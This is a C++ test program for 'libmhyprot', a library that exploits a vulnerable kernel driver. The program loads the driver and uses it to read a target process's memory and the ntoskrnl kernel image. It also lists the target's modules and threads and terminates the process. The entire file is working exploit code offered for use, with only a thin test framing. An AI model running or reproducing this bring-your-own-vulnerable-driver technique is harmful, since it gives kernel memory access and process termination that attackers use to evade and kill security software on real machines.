#include <iostream>
#include <string>
#include <Windows.h>
#include <TlHelp32.h>

#include "../src/nt.hpp"
#include "../src/libmhyprot.h"

#define UDBG(format, ...) printf(format, __VA_ARGS__)
#define CHECK_HANDLE(x) (x && x != INVALID_HANDLE_VALUE)
#define MIN_ADDRESS ((ULONG_PTR)0x8000000000000000)
#define EXEC_TEST(eval, log_fail, log_success, ret) \
    if (!eval) { log_fail; return ret; } else { log_success; }

using unique_handle = std::unique_ptr<void, decltype(&CloseHandle)>;

uint32_t find_process_id(const std::string_view process_name)
{
    PROCESSENTRY32 processentry = {};

    const unique_handle snapshot(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0), &CloseHandle);

    if (!CHECK_HANDLE(snapshot.get()))
    {
        return 0;
    }

    processentry.dwSize = sizeof(MODULEENTRY32);

    while (Process32Next(snapshot.get(), &processentry) == TRUE)
    {
        if (process_name.compare(processentry.szExeFile) == 0)
        {
            return processentry.th32ProcessID;
        }
    }

    return 0;
}

uint64_t find_base_address(const uint32_t process_id)
{
    MODULEENTRY32 module_entry = {};

    const unique_handle snapshot(CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, process_id), &CloseHandle);

    if (!CHECK_HANDLE(snapshot.get()))
    {
        return 0;
    }

    module_entry.dwSize = sizeof(module_entry);

    Module32First(snapshot.get(), &module_entry);

    return (uint64_t)module_entry.modBaseAddr;
}

uint64_t find_sysmodule_address(const std::string_view target_module_name)
{
    const HMODULE module_handle = GetModuleHandle(TEXT("ntdll.dll"));

    if (!CHECK_HANDLE(module_handle))
    {
        return 0;
    }

    pNtQuerySystemInformation NtQuerySystemInformation =
        (pNtQuerySystemInformation)GetProcAddress(module_handle, "NtQuerySystemInformation");

    if (!NtQuerySystemInformation)
    {
        return 0;
    }

    NTSTATUS status;
    PVOID buffer;
    ULONG alloc_size = 0x10000;
    ULONG needed_size;

    do
    {
        buffer = calloc(1, alloc_size);

        if (!buffer)
        {
            return 0;
        }

        status = NtQuerySystemInformation(
            SystemModuleInformation,
            buffer,
            alloc_size,
            &needed_size
        );

        if (!NT_SUCCESS(status) && status != STATUS_INFO_LENGTH_MISMATCH)
        {
            free(buffer);
            return 0;
        }

        if (status == STATUS_INFO_LENGTH_MISMATCH)
        {
            free(buffer);
            buffer = NULL;
            alloc_size *= 2;
        }
    } while (status == STATUS_INFO_LENGTH_MISMATCH);

    if (!buffer)
    {
        return 0;
    }

    PSYSTEM_MODULE_INFORMATION module_information = (PSYSTEM_MODULE_INFORMATION)buffer;

    for (ULONG i = 0; i < module_information->Count; i++)
    {
        SYSTEM_MODULE_INFORMATION_ENTRY module_entry = module_information->Module[i];
        ULONG_PTR module_address = (ULONG_PTR)module_entry.DllBase;

        if (module_address < MIN_ADDRESS)
        {
            continue;
        }

        PCHAR module_name = module_entry.ImageName + module_entry.ModuleNameOffset;

        if (target_module_name.compare(module_name) == 0)
        {
            return module_address;
        }
    }

    free(buffer);

    return 0;
}

//
// main entry point of this tests
// purpose: execute some tests by reading PE from target process
//
int main()
{
    UDBG("[>] libmhyprot tests...\n");

    const uint32_t process_id = find_process_id("notepad.exe");

    if (!process_id)
    {
        UDBG("[!] process not found\n");
        return -1;
    }

    UDBG("[+] process: %d\n", process_id);

    const uint64_t process_base_address = find_base_address(process_id);

    if (!process_base_address)
    {
        UDBG("[!] invalid process base address\n");
        return -1;
    }

    UDBG("[+] main module address: 0x%llX\n", process_base_address);

    if (!libmhyprot::mhyprot_init())
    {
        UDBG("[!] failed to init mhyprot exploit\n");
        libmhyprot::mhyprot_unload();
        return -1;
    }

    const IMAGE_DOS_HEADER dos_header = libmhyprot::
        read_process_memory<IMAGE_DOS_HEADER>(process_id, process_base_address);

    EXEC_TEST(
        dos_header.e_lfanew,
        UDBG("[!] TEST FAILED: invalid dos header received\n"); libmhyprot::mhyprot_unload(),
        UDBG("[+] TEST     OK: nt header offset in dos header is ok\n"),
        -1
    );

    EXEC_TEST(
        dos_header.e_magic == IMAGE_DOS_SIGNATURE,
        UDBG("[!] TEST FAILED: invalid dos header signature"); libmhyprot::mhyprot_unload(),
        UDBG("[+] TEST     OK: dos header signature is ok\n"),
        -1
    );

    const IMAGE_NT_HEADERS nt_header = libmhyprot::
        read_process_memory<IMAGE_NT_HEADERS>(process_id, process_base_address + dos_header.e_lfanew);

    EXEC_TEST(
        nt_header.Signature == IMAGE_NT_SIGNATURE,
        UDBG("[!] TEST FAILED: invalid nt header signature"); libmhyprot::mhyprot_unload(),
        UDBG("[+] TEST     OK: nt header signature is ok\n"),
        -1
    );

    UDBG("[+] system uptime by vulnerable driver : %d(s)\n", libmhyprot::get_system_uptime());

    UDBG("[>] reading memory from kernel...\n");

    const auto sysmodule_name = "ntoskrnl.exe";
    const uint64_t sysmodule_address = find_sysmodule_address(sysmodule_name);

    if (!sysmodule_address)
    {
        UDBG("[!] failed to find %s in sysmodules\n", sysmodule_name);
        libmhyprot::mhyprot_unload();
        return -1;
    }

    UDBG("[+] %s is at 0x%llX\n", sysmodule_name, sysmodule_address);

    const uint64_t kernel_readed_address = libmhyprot::
        read_kernel_memory<uint64_t>(sysmodule_address);

    EXEC_TEST(
        kernel_readed_address,
        UDBG("[!] TEST FAILED: invalid %s address readed\n", sysmodule_name); libmhyprot::mhyprot_unload(),
        UDBG("[+] TEST     OK: kernel read is ok (readed: 0x%llX)\n", kernel_readed_address),
        -1
    );

    UDBG("\n[>] performance tests...\n");

    {
        LARGE_INTEGER freq;
        LARGE_INTEGER start, end;

        if (!QueryPerformanceFrequency(&freq))
        {
            UDBG("[!] failed to get frequency\n");
        }
        else
        {
            if (!QueryPerformanceCounter(&start))
                return -1;

            {
                for (auto i = 0; i < 1000000; i++)
                {
                    libmhyprot::read_process_memory<uint64_t>(process_id, process_base_address);
                }
            }

            if (!QueryPerformanceCounter(&end))
                return -1;

            const double duration = (static_cast<double>(end.QuadPart - start.QuadPart) / freq.QuadPart);

            UDBG("[+] ---> duration: %lf\n", duration);
        }
    }

    UDBG("\n[>] snatching 5 modules from target process using vulnerable driver...\n");
    
    {
        std::vector < std::pair < std::wstring, std::wstring >> module_list;

        if (!libmhyprot::get_process_modules(process_id, 5, module_list))
        {
            UDBG("[<] failed to get process modules\n");
        }
        else
        {
            for (const auto& _module : module_list)
            {
                UDBG("[+] ---> %20ws : %ws\n", _module.first.c_str(), _module.second.c_str());
            }

            UDBG("[<] snatched\n\n");
        }
    }

    UDBG("\n[>] snatching threads from target process using vulnerable driver...\n");

    std::vector<MHYPROT_THREAD_INFORMATION> thread_list;

    if (!libmhyprot::get_process_threads(process_id, process_id, thread_list))
    {
        UDBG("[<] failed to get process threads\n");
    }
    else
    {
        for (const auto& thread : thread_list)
        {
            UDBG("[+] ---> 0x%llX : 0x%llX : %d\n", thread.kernel_address, thread.start_address, thread.unknown);
        }

        UDBG("[<] snatched\n\n");
    }

    UDBG("\n[>] Terminating target process using vulnerable driver...\n");

    if (libmhyprot::terminate_process(process_id))
    {
        UDBG("[+] successfully terminated!\n\n");
    }
    else
    {
        UDBG("[+] failed to terminate.\n\n");
    }

    UDBG("[<] done\n");

    libmhyprot::mhyprot_unload();

    return 0;
}